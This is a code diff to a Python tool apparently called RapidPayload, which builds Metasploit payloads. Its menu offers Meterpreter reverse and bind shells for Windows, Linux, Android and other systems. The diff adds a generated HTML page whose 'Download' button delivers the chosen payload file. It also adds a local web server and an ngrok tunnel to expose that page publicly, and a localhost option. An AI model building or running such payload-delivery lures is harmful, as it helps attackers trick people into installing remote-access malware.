@@ -229,6 +229,51 @@ def Ngrok():
     os.system("ls")	
     print("")
     name1=input("\n{0}{1}RapidPayload:~/FileName# {2}".format(cyan, bold, end))
+    
+    def index_defaultNgrok():
+    
+        with open("index.html", "w") as file:
+            file.write("""
+
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<!-- AngelSecurityTeam -->
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+<style>
+.btn {
+  background-color: DodgerBlue;
+  border: none;
+  color: white;
+  padding: 12px 30px;
+  cursor: pointer;
+  font-size: 20px;
+}
+
+
+.btn:hover {
+  background-color: RoyalBlue;
+}
+
+
+</style>	
+<title></title>
+<script src="http://code.jquery.com/jquery-3.2.1.min.js"></script>
+</head>
+<body>
+<div class="wrapper">
+<center>
+<!-- AngelSecurityTeam -->
+<input type="submit" class="btn" style="width:40%" class="fa fa-download" class="BotonDown" value="Download" onclick="document.location.href='"""+name1+"""' ">
+</center>
+</a>
+</div>
+</body>
+</html> 
+          """)    
+    
+    index_defaultNgrok()
     #http.server 80
     os.system("python3 -m http.server 80 > .server 2> /dev/null &")          
     os.system("chmod +x ngrok")
@@ -240,11 +285,67 @@ def Ngrok():
     urlFile = open('link2.url', 'r')
     url = urlFile.read()
     urlFile.close()
-    if re.match("https://[0-9a-z]*\.ngrok.io", url) != None:
-      linkngrok=url+'/'+name1		
-      print("\n\033[1m\033[36mRapidPayload:~/LinkNgrok# \033[1m\033[0m"+linkngrok)
+    if re.match("https://[0-9a-z]*\.ngrok.io", url) != None:		
+      print("\n\033[1m\033[36mRapidPayload:~/LinkNgrok# \033[1m\033[0m"+url)
    
     print(" ")	
+
+def localhost():
+    print("\033[1m\033[36m")
+    os.system("ls")	
+    print("")
+    name2=input("\n{0}{1}RapidPayload:~/FileName# {2}".format(cyan, bold, end))
+    
+    def index_defaultlocalhost():
+    
+        with open("index.html", "w") as file:
+            file.write("""
+
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<!-- AngelSecurityTeam -->
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+<style>
+.btn {
+  background-color: DodgerBlue;
+  border: none;
+  color: white;
+  padding: 12px 30px;
+  cursor: pointer;
+  font-size: 20px;
+}
+
+
+.btn:hover {
+  background-color: RoyalBlue;
+}
+
+
+</style>	
+<title></title>
+<script src="http://code.jquery.com/jquery-3.2.1.min.js"></script>
+</head>
+<body>
+<div class="wrapper">
+<center>
+<!-- AngelSecurityTeam -->
+<input type="submit" class="btn" style="width:40%" class="fa fa-download" class="BotonDown" value="Download" onclick="document.location.href='"""+name2+"""' ">
+</center>
+</a>
+</div>
+</body>
+</html> 
+          """)    
+    
+    index_defaultlocalhost()
+    #http.server 80
+    os.system("python3 -m http.server 80 > .server 2> /dev/null &")          		
+    print("\n\033[1m\033[36mRapidPayload:~/LinkNgrok# \033[1m\033[0m"+"http://localhost:80")
+   
+    print(" ")
+
 
 def MSF():
     host1=input("\n{0}{1}RapidPayload:~/LHOST# {2}".format(cyan, bold, end))
@@ -256,7 +357,7 @@ def MSF():
      
 def RapidP():
     
-    select = input('\n{2}{0}{2}[{1}{2}1{0}]{2}{1} {2}Windows\n{0}{2}[{1}{2}2{2}{0}]{1} {2}Linux\n{0}{2}[{1}{2}3{2}{0}]{1} {2}Android\n{0}{2}[{1}{2}{2}4{0}]{1} {2}Python\n{0}{2}[{1}{2}{2}5{0}]{1} {2}MacOS\n{0}{2}[{1}{2}{2}6{0}]{1} {2}Java\n{0}{2}[{1}{2}{2}7{0}]{1} {2}Apple_ios\n{0}{2}[{1}{2}{2}8{0}]{1} {2}Connect_Ngrok\n{0}{2}[{1}{2}{2}9{0}]{1} {2}Connect_MSF\n{0}{0}[{1}{2}0{0}]{1} {2}Exit\n\n{0}{2}RapidPayload:~#{1} '.format(cyan, end, bold))
+    select = input('\n{2}{0}{2}[{1}{2}1{0}]{2}{1} {2}Windows\n{0}{2}[{1}{2}2{2}{0}]{1} {2}Linux\n{0}{2}[{1}{2}3{2}{0}]{1} {2}Android\n{0}{2}[{1}{2}{2}4{0}]{1} {2}Python\n{0}{2}[{1}{2}{2}5{0}]{1} {2}MacOS\n{0}{2}[{1}{2}{2}6{0}]{1} {2}Java\n{0}{2}[{1}{2}{2}7{0}]{1} {2}Apple_ios\n{0}{2}[{1}{2}{2}8{0}]{1} {2}Connect_Ngrok\n{0}{2}[{1}{2}{2}9{0}]{1} {2}Connect_LocalHost\n{0}{2}[{1}{2}{2}10{0}]{1} {2}Connect_MSF\n{0}{0}[{1}{2}0{0}]{1} {2}Exit\n\n{0}{2}RapidPayload:~#{1} '.format(cyan, end, bold))
     if select == '1':        
         type = input('{2}{1}\n\n{0}{2}[{1}{2}1{0}]{1} {2}windows/meterpreter/reverse_http\n{0}[{1}{2}2{0}]{1} {2}windows/meterpreter/reverse_https\n{0}[{1}{2}3{0}]{1} {2}windows/meterpreter/reverse_tcp\n{0}[{1}{2}4{0}]{1} {2}windows/meterpreter/bind_tcp\n{0}[{1}{2}5{0}]{1} {2}windows/shell/bind_tcp\n{0}[{1}{2}6{0}]{1} {2}windows/shell/reverse_tcp\n{0}[{1}{2}0{0}]{1} {2}Menu\n\n{0}{2}RapidPayload:~/Windows#{1} '.format(cyan, end, bold))
         if type == '0':
@@ -302,9 +403,12 @@ def RapidP():
     if select == '8':
         Ngrok()
     if select == '9':
+        localhost()        
+    if select == '10':
         MSF()                
     elif select == '0':
         print("\n")
+        os.system("fuser -k -n tcp 80") # kill PORT 80
         exit(0)
     else:
         sleep(2)
